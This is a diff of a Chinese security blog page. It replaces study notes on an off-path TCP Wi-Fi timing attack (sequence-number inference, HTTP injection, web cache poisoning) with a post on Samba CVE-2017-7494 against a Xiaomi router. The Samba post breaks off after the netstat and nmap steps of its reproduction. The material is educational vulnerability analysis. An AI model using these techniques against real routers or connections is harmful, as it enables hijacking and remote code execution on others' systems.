@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="侧信道攻击,wifi,">
+  <meta name="keywords" content="Samba,远程执行,CVE,">
 
 
 
@@ -79,31 +79,32 @@
 
 
 
-<meta name="description" content="TCP侧信道分析及利用的学习报告论文来源：USENIX SECURITY 2018：Off-Path TCP Exploit: How Wireless Routers Can Jeopardize Your Secrets下载：原文pdf中文slides 背景知识测信道香农信息论  什么是信息？ 用来减少随机不确定的东西 什么是加密？ 类似于加噪声，增加随机不确定性  “从密码分析者来看，一个保">
-<meta name="keywords" content="侧信道攻击,wifi">
+<meta name="description" content="小米路由器与Samba漏洞CVE-2017-7494漏洞描述Samba服务器软件存在远程执行代码漏洞。攻击者可以利用客户端将指定库文件上传到具有可写权限的共享目录，会导致服务器加载并执行指定的库文件。具体执行条件如下：  服务器打开了文件/打印机共享端口445，让其能够在公网上访问  共享文件拥有写入权限  恶意攻击者需猜解Samba服务端共享目录的物理路径   Samba介绍Samba是在Lin">
+<meta name="keywords" content="Samba,远程执行,CVE">
 <meta property="og:type" content="article">
-<meta property="og:title" content="wifi半双工侧信道攻击学习笔记">
-<meta property="og:url" content="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/index.html">
+<meta property="og:title" content="小米路由器与Samba漏洞CVE-2017-7494">
+<meta property="og:url" content="https://cool-y.github.io/2019/03/25/Samba-CVE/index.html">
 <meta property="og:site_name" content="混元霹雳手">
-<meta property="og:description" content="TCP侧信道分析及利用的学习报告论文来源：USENIX SECURITY 2018：Off-Path TCP Exploit: How Wireless Routers Can Jeopardize Your Secrets下载：原文pdf中文slides 背景知识测信道香农信息论  什么是信息？ 用来减少随机不确定的东西 什么是加密？ 类似于加噪声，增加随机不确定性  “从密码分析者来看，一个保">
+<meta property="og:description" content="小米路由器与Samba漏洞CVE-2017-7494漏洞描述Samba服务器软件存在远程执行代码漏洞。攻击者可以利用客户端将指定库文件上传到具有可写权限的共享目录，会导致服务器加载并执行指定的库文件。具体执行条件如下：  服务器打开了文件/打印机共享端口445，让其能够在公网上访问  共享文件拥有写入权限  恶意攻击者需猜解Samba服务端共享目录的物理路径   Samba介绍Samba是在Lin">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/1.png">
-<meta property="og:image" content="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/2-Man_in_the_middle_attack.svg.png">
-<meta property="og:image" content="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/3-Connection_TCP.png">
-<meta property="og:image" content="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/5-攻击模型.PNG">
-<meta property="og:image" content="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/4-netstat获取信息.jpg">
-<meta property="og:image" content="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/6-GRL-R.png">
-<meta property="og:image" content="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/7-GRL-L.png">
-<meta property="og:image" content="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/8-收包原理.jpg">
-<meta property="og:image" content="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/8-noTrigger.PNG">
-<meta property="og:image" content="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/8-trigger.PNG">
-<meta property="og:image" content="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/9-序列号推断.PNG">
-<meta property="og:image" content="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/9-http注入.PNG">
-<meta property="og:updated_time" content="2019-03-23T04:55:03.176Z">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-00-46.png">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-59-58.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-01-19.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-09-40.png">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/23-15-57.png">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-38-48.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-14-43.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-48-27.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-18-44.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-26-47.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-38-28.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-43-02.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-45-01.png">
+<meta property="og:updated_time" content="2019-03-25T13:44:10.764Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="wifi半双工侧信道攻击学习笔记">
-<meta name="twitter:description" content="TCP侧信道分析及利用的学习报告论文来源：USENIX SECURITY 2018：Off-Path TCP Exploit: How Wireless Routers Can Jeopardize Your Secrets下载：原文pdf中文slides 背景知识测信道香农信息论  什么是信息？ 用来减少随机不确定的东西 什么是加密？ 类似于加噪声，增加随机不确定性  “从密码分析者来看，一个保">
-<meta name="twitter:image" content="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/1.png">
+<meta name="twitter:title" content="小米路由器与Samba漏洞CVE-2017-7494">
+<meta name="twitter:description" content="小米路由器与Samba漏洞CVE-2017-7494漏洞描述Samba服务器软件存在远程执行代码漏洞。攻击者可以利用客户端将指定库文件上传到具有可写权限的共享目录，会导致服务器加载并执行指定的库文件。具体执行条件如下：  服务器打开了文件/打印机共享端口445，让其能够在公网上访问  共享文件拥有写入权限  恶意攻击者需猜解Samba服务端共享目录的物理路径   Samba介绍Samba是在Lin">
+<meta name="twitter:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-00-46.png">
 
 
 
@@ -133,13 +134,13 @@
 
 
 
-  <link rel="canonical" href="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/">
+  <link rel="canonical" href="https://cool-y.github.io/2019/03/25/Samba-CVE/">
 
 
 
 
 
-  <title>wifi半双工侧信道攻击学习笔记 | 混元霹雳手</title>
+  <title>小米路由器与Samba漏洞CVE-2017-7494 | 混元霹雳手</title>
   
 
 
@@ -308,7 +309,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://cool-y.github.io/2019/01/16/wifi半双工侧信道攻击学习笔记/">
+    <link itemprop="mainEntityOfPage" href="https://cool-y.github.io/2019/03/25/Samba-CVE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Cool-Y">
@@ -325,7 +326,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">wifi半双工侧信道攻击学习笔记</h1>
+          <h1 class="post-title" itemprop="name headline">小米路由器与Samba漏洞CVE-2017-7494</h1>
         
 
         <div class="post-meta">
@@ -337,8 +338,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-16T15:35:27+08:00">
-                2019-01-16
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-25T13:45:16+08:00">
+                2019-03-25
               </time>
             
 
@@ -360,8 +361,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/顶会论文/" itemprop="url" rel="index">
-                    <span itemprop="name">顶会论文</span>
+                  <a href="/categories/IOT/" itemprop="url" rel="index">
+                    <span itemprop="name">IOT</span>
                   </a>
                 </span>
 
@@ -378,8 +379,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/01/16/wifi半双工侧信道攻击学习笔记/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count gitment-comments-count" data-xid="/2019/01/16/wifi半双工侧信道攻击学习笔记/" itemprop="commentsCount"></span>
+                <a href="/2019/03/25/Samba-CVE/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2019/03/25/Samba-CVE/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -387,7 +388,7 @@
 
           
           
-             <span id="/2019/01/16/wifi半双工侧信道攻击学习笔记/" class="leancloud_visitors" data-flag-title="wifi半双工侧信道攻击学习笔记">
+             <span id="/2019/03/25/Samba-CVE/" class="leancloud_visitors" data-flag-title="小米路由器与Samba漏洞CVE-2017-7494">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -410,7 +411,7 @@
                 </span>
                 
                 <span title="字数统计">
-                  3.7k 字
+                  1.6k 字
                 </span>
               
 
@@ -424,7 +425,7 @@
                 </span>
                 
                 <span title="阅读时长">
-                  13 分钟
+                  6 分钟
                 </span>
               
             </div>
@@ -445,152 +446,40 @@
       
 
       
-        <h1 id="TCP侧信道分析及利用的学习报告"><a href="#TCP侧信道分析及利用的学习报告" class="headerlink" title="TCP侧信道分析及利用的学习报告"></a>TCP侧信道分析及利用的学习报告</h1><p><strong><em>论文来源：</em></strong>USENIX SECURITY 2018：Off-Path TCP Exploit: How Wireless Routers Can Jeopardize Your Secrets<br><strong><em>下载：</em></strong><br><a href="https://www.usenix.org/conference/usenixsecurity18/presentation/chen-weiteng" target="_blank" rel="noopener">原文pdf</a><br><a href="https://res.cloudinary.com/dozyfkbg3/raw/upload/v1553316881/ARE/wifi.pptx" target="_blank" rel="noopener">中文slides</a></p>
-<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="测信道"><a href="#测信道" class="headerlink" title="测信道"></a>测信道</h3><p><strong>香农信息论</strong></p>
-<p><img src="./1.png" alt="信息熵"></p>
-<p><strong>什么是信息？</strong> 用来减少随机不确定的东西</p>
-<p><strong>什么是加密？</strong> 类似于加噪声，增加随机不确定性</p>
-<blockquote>
-<p>“从密码分析者来看，一个保密系统几乎就是一个通信系统。待传的消息是统计事件，加密所用的密钥按概率选出，加密结果为密报，这是分析者可以利用的，类似于受扰信号。”</p>
-</blockquote>
-<p><strong>侧信道随之出现</strong> 越过加密算法增加的随机不定性，从其他的渠道获取数据标签，确定信息内容。</p>
+        <h1 id="小米路由器与Samba漏洞CVE-2017-7494"><a href="#小米路由器与Samba漏洞CVE-2017-7494" class="headerlink" title="小米路由器与Samba漏洞CVE-2017-7494"></a>小米路由器与Samba漏洞CVE-2017-7494</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Samba服务器软件存在远程执行代码漏洞。攻击者可以利用客户端将指定库文件上传到具有可写权限的共享目录，会导致服务器加载并执行指定的库文件。<br>具体执行条件如下：</p>
 <ol>
-<li>早期：采集加密电子设备在运行过程中的时间消耗、功率消耗或者电磁辐射消耗等边缘信息的差异性</li>
-<li>而随着研究的深入，逐渐从加密设备延伸到计算机内部CPU、内存等之间的信息传递</li>
-<li>并在Web应用交互信息传递越来越频繁时，延伸到了网络加密数据流的破解方面</li>
-</ol>
-<p><strong>侧信道攻击的流程</strong> 第一个就是侧信道泄露的截取，第二个是信息的恢复。</p>
-<hr>
-<h3 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h3><ol>
-<li>中间人攻击<blockquote>
-<p>“指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。”</p>
-</blockquote>
+<li><p>服务器打开了文件/打印机共享端口445，让其能够在公网上访问</p>
+</li>
+<li><p>共享文件拥有写入权限</p>
+</li>
+<li><p>恶意攻击者需猜解Samba服务端共享目录的物理路径</p>
 </li>
 </ol>
-<p><img src="./2-Man_in_the_middle_attack.svg.png" alt></p>
-<ul>
-<li>公共wifi、路由器劫持</li>
-<li>一般使用加密来防御</li>
-<li>加密的代价：维护密钥证书、影响功能（运营商无法做缓存）</li>
-</ul>
-<ol start="2">
-<li>非中间人攻击/偏离路径攻击/off-path attack<blockquote>
-<p>通信线路之外，攻击者看不到双方的消息，没办法截获和发送通信包。智能伪造成一方给另一方发消息。</p>
-</blockquote>
-</li>
-</ol>
-<ul>
-<li>攻击成功需要：消息合法+最先到达</li>
-<li>防御措施：challenge-response/询问-应答机制<br>双方在通信前交换一个随机数，这个随机数在每次的通信中都要被附带，而中间人看不见这个随机数，因此伪造的消息被认为不合法。</li>
-<li>攻击者如何得到这个随机数：侧信道</li>
-</ul>
-<hr>
-<h3 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h3><p><img src="./3-Connection_TCP.png" alt></p>
-<blockquote>
-<ol>
-<li>客户端通过向服务器端发送一个SYN来创建一个主动打开，作为三路握手的一部分。客户端把这段连接的序号设定为<em>随机数A</em>。</li>
-<li>服务器端应当为一个合法的SYN回送一个SYN/ACK。ACK的确认码应为A+1，SYN/ACK包本身又有一个<em>随机产生的序号B</em>。</li>
-<li>最后，客户端再发送一个ACK。当服务端收到这个ACK的时候，就完成了三路握手，并进入了连接创建状态。此时包的序号被设定为收到的确认号A+1，而响应号则为B+1。</li>
-</ol>
-</blockquote>
-<p>通过三次握手，确定对方不是非中间人</p>
-<p><strong><em>TCP序列号的问题</em></strong></p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">1985</th>
-<th style="text-align:center">1995</th>
-<th style="text-align:center">2001</th>
-<th style="text-align:center">2004</th>
-<th style="text-align:center">2007</th>
-<th style="text-align:center">2012</th>
-<th style="text-align:center">2012</th>
-<th style="text-align:center">2016</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">Morris</td>
-<td style="text-align:center">Mitnik</td>
-<td style="text-align:center">Zalewsky</td>
-<td style="text-align:center">Waston</td>
-<td style="text-align:center">kLM</td>
-<td style="text-align:center">Herzberg</td>
-<td style="text-align:center">作者</td>
-<td style="text-align:center">作者</td>
-</tr>
-<tr>
-<td style="text-align:center">初始序列可预测</td>
-<td style="text-align:center">真实利用</td>
-<td style="text-align:center">漏洞仍在</td>
-<td style="text-align:center">BGP DoS</td>
-<td style="text-align:center">Windows攻击</td>
-<td style="text-align:center">Puppet-assisted</td>
-<td style="text-align:center">Malware-assisted</td>
-<td style="text-align:center">off-path attack</td>
-</tr>
-</tbody>
-</table>
-<ol>
-<li>90年代时发现并不随机：1995年伪造客户端连接微软大楼的服务器</li>
-<li>2007年在windows场景下用IDID侧信道猜出序列号：只针对Windows，花费几小时</li>
-</ol>
-<hr>
-<h2 id="Malware-assisted"><a href="#Malware-assisted" class="headerlink" title="Malware-assisted"></a>Malware-assisted</h2><p><strong>攻击模型：</strong><br>给受害者安装一个无特权的应用程序（仅能网络连接），这个程序跟非中间人的攻击者里应外合，劫持手机上所有的TCP连接。<br><img src="./5-攻击模型.PNG" alt></p>
-<p><strong>如何劫持TCP</strong></p>
-<ol>
-<li><p>需要的信息：Facebook的连接IP地址和端口号，由此可以知道TCP连接的序列号，利用序列号伪装成Facebook给手机发消息。<br>使用netstat命令获取：<br><img src="./4-netstat获取信息.jpg" alt></p>
-</li>
-<li><p>任务：由于TCP的序列号通常连续，所以要精确猜到它的下一个序列号。</p>
-</li>
-<li>如何验证序列号正确：通过某种侧信道，这个恶意软件在后台可以提供反馈。</li>
-</ol>
-<h3 id="变种一：防火墙"><a href="#变种一：防火墙" class="headerlink" title="变种一：防火墙"></a>变种一：防火墙</h3><p><strong>攻击过程：</strong> TCP三次握手之后产生A和B，将来传输的包序列号必须跟A和B很接近，否则，防火墙会丢弃这个包。因此只有猜对了序列号，包才能到达手机端。到达手机端后，后台的恶意软件可以帮助我们判断手机是否接受了这个数据包。</p>
-<p><strong>具体侧信道方案：</strong> CPU资源使用率（噪音很大）——&gt;TCP计数器（后台软件运行制造噪音）——&gt;低噪音计数器：包被丢掉时，一个相应的错误计数器。</p>
-<p><strong>解决方法：</strong> 关闭防火墙检查序列号的功能</p>
-<h3 id="变种二：无防火墙"><a href="#变种二：无防火墙" class="headerlink" title="变种二：无防火墙"></a>变种二：无防火墙</h3><p>具体侧信道方案：跟TCP业务逻辑有关的计数器——收到的TCP包序列号小于期望时增加，大于时不变。二分查找搜索正确的序列号。<br>影响范围：Android、Linux、MacOS、FreeBSD</p>
-<hr>
-<h2 id="Pure-off-path-无恶意软件协助"><a href="#Pure-off-path-无恶意软件协助" class="headerlink" title="Pure off-path:无恶意软件协助"></a>Pure off-path:无恶意软件协助</h2><blockquote>
-<p>不植入恶意软件，劫持任意两台机器的TCP连接：首先确定是否建立TCP连接，然后推测其序列号A和B。</p>
-</blockquote>
-<h3 id="Global-Rate-Limit"><a href="#Global-Rate-Limit" class="headerlink" title="Global Rate Limit"></a>Global Rate Limit</h3><blockquote>
-<p>USENIX 2016 : Off-Path TCP Exploits: Global Rate Limit Considered Dangerous</p>
-</blockquote>
-<p><strong>侧信道：</strong> 所有的侧信道，本质上就是攻击者和受害者之间共享着某些资源，如之前的全局TCP计数器。这里使用的侧信道是 <strong><em>服务器上</em></strong> 的共享资源，<strong><em>限速器</em></strong>（RFC 5961）限制某一种包的发送速率（默认100p/s）</p>
-<p><strong>如何利用共享限速器：</strong><br>先判断是否建立了连接。然后伪造TCP包，需要猜测源端口，如果猜测正确，服务器会返回一个challenge，攻击者不断触发，一共可以收到99个（还有一个发给了客户端）；如果猜测错误，则一共可以收到100个challenge。</p>
-<p><img src="./6-GRL-R.png" alt></p>
-<p><img src="./7-GRL-L.png" alt></p>
-<p><strong>评估：</strong> 是否建立了连接：&lt;10s  ;  Seq：30s  ； ACK:&lt;10s</p>
-<p><strong>解决方案：</strong> 1. 加噪音，100变成150、200；2. 限速器做成局部的</p>
-<hr>
-<h3 id="Unfixable-WiFi-timing"><a href="#Unfixable-WiFi-timing" class="headerlink" title="Unfixable WiFi timing"></a>Unfixable WiFi timing</h3><blockquote>
-<p>USENIX 2018 : Off-Path TCP Exploit: How Wireless Routers<br>Can Jeopardize Your Secrets<br>之前的漏洞无论是计数器还是限速器都属于软件，很好更正，但这篇文章的漏洞利用无法修复。</p>
-</blockquote>
-<p><strong>TCP收包的原理：</strong> 通常TCP收包要看这个包是否匹配了当前的某一个连接。如果连接匹配上了，就会去看这个包的序列号；如果序列号不对，会触发一个回复，说明这个序列号存在问题；如果序列号正确，但反向序列号不对，也会丢包。当连接匹配、序列号和反向序列号正确时，就会返回一个数据包。<br><img src="./8-收包原理.jpg" alt></p>
-<p><strong>侧信道：</strong> 攻击者伪装成服务器给客户端发包，正确的序列号会有<strong><em>回复</em></strong>，错误则没有。但回复时发送给服务器的，有没有回复攻击者并不知道。那么如何去判断有没有回复，利用无线网络的  <strong><em>半双工</em></strong> 传输。<br>让有回包和没有回包的时间差异放大。</p>
-<p><strong>判断流程：</strong> 客户端和路由器之间wifi通信。攻击者依次发送三个数据包，第一个包用来测试正常的RTT。第2个包是伪装成服务器发送的，如果第2个包猜对了，客户端会向服务器返回数据包，这会导致占用更长时间的wifi信道，从而会使第3个包的RTT更长。<br><img src="./8-noTrigger.PNG" alt></p>
-<p><img src="./8-trigger.PNG" alt></p>
-<p><strong>评估：</strong> 在本地环境下，如果发送40个包，就有20ms的RTT差别。</p>
-<p><strong>攻击应用：</strong><br><strong>1. 攻击模型：</strong> 受害者访问了我们的钓鱼网站，这时javascript（傀儡）会在后台执行，主动建立到攻击者的连接（规避NAT或防火墙造成的不可抵达问题），这时攻击者就可以从外网测试RTT。</p>
-<blockquote>
-<p>与理想情况的不同：客户端通常在NAT或防火墙之后；操作系统不一定严格遵守TCP收包的原则</p>
-</blockquote>
-<pre><code>Attacker -------wire----------|
-                           Router ---------wireless-------Victim (client)
-Server   -------wire----------|
-</code></pre><p><strong>2. 攻击目标：</strong> 推断出客户端和服务器是否建立了连接；合计连接中交换的字节数或强制中断连接；注入恶意payload到连接（不失一般性的关注web缓存投毒）。前两个不需要傀儡初始化连接，第三个不一定需要，但攻击者控制了时序，能够简化攻击。</p>
-<p><strong>3. 攻击过程：</strong> 假设傀儡已经建立了连接，攻击者可以劫持并替换任何不加密的网站（如武汉大学），并在浏览器缓存。这是因为当浏览器请求相同的ip地址时，会复用之前的TCP连接。这意味着恶意网站中的傀儡可以通过重复HTML元素来建立到目标域名的单个持久连接。然后，路径外攻击者可以进行侧信道攻击，以推断目标连接中使用的端口号和序列号，然后注入虚假的http响应，并要求浏览器不重新检查对象的新鲜度，从而达到持续性的缓存投毒。</p>
-<p><strong>4. 细节：</strong></p>
-<ul>
-<li><strong>连接（四元组）推断：</strong> 每一轮使用30个重复包测试一个端口，如果端口号正确，就会发现RTT大幅增加。如果还要完成 <strong><em>web缓存投毒</em></strong>  ，还需要傀儡初始化连接来协助，根据系统不同，有不同的端口选择算法可以优化：<strong><em>windows&amp;macOS</em></strong> 使用全局和顺序端口分配策略为其TCP连接选择短暂的端口号，这意味着攻击者可以在观察到与恶意Web服务器的初始连接后推断出要使用的下一个端口号，这完全消除了对端口号推断的需要。<strong><em>NAT</em></strong> 端口保留，不需要关心外部端口被转换成不可预知的内部端口。<strong><em>来自同一域名的多个IP地址</em></strong>，这意味着攻击者需要付出更大的代价来推断端口号。</li>
-<li><strong>序列号推断：</strong> 通过利用时序侧信道来判断是否存在相应的响应，从而将窗口序列号与窗外序列号区分开来。一旦我们得到一个 <strong><em>窗口内序列号</em></strong>，通过进行二分搜索进一步将序列号空间缩小到单个值  <strong><em>RCV.NXT</em></strong>。如果还要使用傀儡建立的连接发起web缓存投毒，可以进一步优化：<strong><em>增大接收窗口的大小</em></strong>，可以减少猜测的迭代次数，通常可以放大到500000(之前是65535)，而且根据RFC793,窗口放大之后就永远不会缩小。<br><img src="./9-序列号推断.PNG" alt></li>
-<li><p><strong>TCP劫持：</strong> 通过劫持傀儡初始化的连接，可以简化web缓存投毒的过程。三个os在ACK验证上都不符合规范，所以各自处理情况也不同——<strong><em>windows</em></strong>：客户端必须持续发送请求以防止ACK接收窗口仅为一个字节，这要求攻击者必须能准确预期下一个序列号并解决大量流量带来的噪声。<br>因此，作者设计了一种新策略，该策略利用处理重叠数据的TCP行为和处理损坏的HTTP响应的浏览器行为——在Windows主机上缓冲的攻击者注入数据可能会破坏来自服务器的真实HTTP响应。 <strong><em>（1）注入</em></strong>，傀儡不断从服务器上请求脚本，而攻击者发送2^23/|wnd|个欺骗性数据包，这些包的窗口序列号与RCV.NXT加上偏移量相匹配，其中|wnd|为ack接收窗口大小，第i个数据包的ACK号为i*|wnd|，payload为</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">websocket.send(|wnd|*i)</span><br></pre></td></tr></table></figure>
-<p>  因此，这些数据包中包含有效ACK号的一个包将被缓冲，并破坏真实的HTTP响应头。浏览器执行注入的脚本时，它将通过websocket发送猜测的ACK号，提供有效的窗口内ACK号。<br><img src="./9-http注入.PNG" alt><br><strong><em>（2）利用</em></strong>，由于客户端已经接受了额外的欺骗payload，推进了其预期的序列号，因此客户端和服务器实际上已经被去同步。攻击者现在可以简单地发送欺骗性响应（知道预期的序列号和有效的ACK号）。如果我们只想执行一次性注入，只需用恶意脚本替换第一步中的payload就足够了。<br>此外，针对Windows的注入步骤存在更加通用的替代策略，不依赖于浏览器行为。 具体来说，由于HTTP响应的前几个字节是可预先确定的（即HTTP），不破坏真实的响应，而是覆盖标题和正文以形成合法但恶意的响应。 在这种情况下，浏览器将完全忘记注入的存在。 这表明一旦序列号泄露，就存在各种方法来有效地将数据注入浏览器，而不用进行基于时间信道的慢得多的ACK号推断。</p>
-</li>
-</ul>
-<hr>
-<h2 id="Discussion"><a href="#Discussion" class="headerlink" title="Discussion"></a>Discussion</h2><p>时序侧信道来自无线网络的半双工性质。由于无线协议中固有的冲突和回退，它被进一步放大。正如我们的测试路由器所证实的那样，现代无线路由器都支持CSMA / CA和RTS / CTS，因为它是802.11标准的一部分，并且该原则不太可能很快改变。<br>虽然作者只讨论威胁模型，其中来自受害客户端的连接是针对性的，但攻击实际上也适用于源自通过同一无线路由器连接的其他客户端的连接。这是因为所有这些客户端（例如，在相同NAT之后）共享了相同的冲突域并因此遭受相同的定时信道。通过探测数据包在任何客户端上触发的响应将有效地延迟探测后查询。在这种情况下，受害者连接（通过傀儡打开）只是为远程攻击者提供了测量碰撞的机会。<br>此外，我们可以扩展威胁模型以考虑无线连接的服务器，例如物联网设备。已经证明，通过公共IP地址和开放端口可以访问数百万个物联网设备。在这种情况下，可以针对此类IoT设备上的连接启动完全偏离路径的攻击。例如，计算在连接上交换的字节，终止与另一主机的连接，在正在进行的telnet连接上注入恶意命令。</p>
+<h2 id="Samba介绍"><a href="#Samba介绍" class="headerlink" title="Samba介绍"></a>Samba介绍</h2><p>Samba是在Linux和Unix系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。</p>
+<p>SMB协议是客户机/服务器型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。通过设置“NetBIOS over TCP/IP”使得Samba不但能与局域网络主机分享资源，还能与全世界的电脑分享资源。</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>处于\source3\rpc_server\src_pipe.c的is_known_pipename()函数未对传进来的管道名pipename的路径分隔符/进行识别过滤，导致可以用绝对路径调用恶意的so文件，从而远程任意代码执行。<br>首先看到is_known_pipename()函数<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-00-46.png" alt></p>
+<p>跟进到smb_probe_module()<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-59-58.jpg" alt></p>
+<p>再跟进到do_smb_load_module()，发现调用的过程就在其中,调用了传进来的moudule_name对应的init_samba_module函数<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-01-19.jpg" alt></p>
+<p>我们可以通过smb服务上传一个恶意的so文件，该文件包含一个输出函数init_samba_module，随后通过上述过程进行调用，执行任意代码。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="小米路由器"><a href="#小米路由器" class="headerlink" title="小米路由器"></a>小米路由器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netstat -apnt</span><br><span class="line">tcp    0   0 192.168.31.1:445   0.0.0.0:*     LISTEN   0 572 1917/smbd</span><br><span class="line"></span><br><span class="line">nmap 192.168.31.1</span><br><span class="line">139/tcp  open     netbios-ssn</span><br><span class="line">445/tcp  open     